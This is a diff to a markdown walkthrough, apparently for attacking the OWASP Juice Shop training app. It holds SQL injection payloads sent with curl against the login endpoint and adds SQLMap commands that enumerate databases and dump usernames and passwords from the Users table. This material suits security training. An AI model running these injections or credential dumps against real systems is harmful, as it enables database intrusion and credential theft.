@@ -55,12 +55,60 @@ curl -X POST "http://10.30.0.237:3000/rest/user/login" \
 curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\'' UNION SELECT id,email,password FROM Users WHERE email='\''admin@juice-sh.op'\''--","password":"test"}'
-
-# Boolean-based blind injection to confirm admin exists
-curl -X POST "http://10.30.0.237:3000/rest/user/login" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op'\'' AND (SELECT COUNT(*) FROM Users WHERE email='\''admin@juice-sh.op'\'')>0--","password":"test"}'
 ```
+
+### SQLMap Automated Testing
+
+SQLMap is a powerful tool for automating the detection and exploitation of SQL injection vulnerabilities. Here's how to use it step-by-step:
+
+1.  **Identify SQL injection vulnerability:**
+
+    - Use the following command to test for SQL injection in the login form:
+
+      ```bash
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data="email=test@test.com&password=test" --level 5 --risk 3
+      ```
+
+    - `Explanation:`
+      - `-u`: Specifies the target URL.
+      - `--data`: Provides the POST data for the login form.
+      - `--level 5`: Specifies the level of tests to perform (1-5, where 5 is the most thorough).
+      - `--risk 3`: Specifies the risk level (1-3, where 3 includes more aggressive tests).
+
+2.  **Enumerate databases:**
+
+    - Once SQLMap confirms the vulnerability, enumerate the available databases:
+
+      ```bash
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data="email=test@test.com&password=test" --level 5 --risk 3 --dbs
+      ```
+
+    - `Explanation:`
+      - `--dbs`: Enumerate all databases.
+
+3.  **Enumerate tables:**
+
+    - Specify the database to enumerate tables from:
+
+      ```bash
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data="email=test@test.com&password=test" --level 5 --risk 3 -D "OWASP_Juice_Shop" --tables
+      ```
+
+    - `Explanation:`
+      - `-D "OWASP_Juice_Shop"`: Specifies the database name.
+      - `--tables`: Enumerate tables in the specified database.
+
+4.  **Dump data from the Users table:**
+
+    - To extract usernames and passwords, dump the data from the `Users` table:
+
+      ```bash
+      sqlmap -u "http://10.30.0.237:3000/rest/user/login" --data="email=test@test.com&password=test" --level 5 --risk 3 -D "OWASP_Juice_Shop" -T "Users" --dump
+      ```
+
+    - `Explanation:`
+      - `-T "Users"`: Specifies the table name.
+      - `--dump`: Dump the contents of the table.
 
 ### Automated Python Script
 
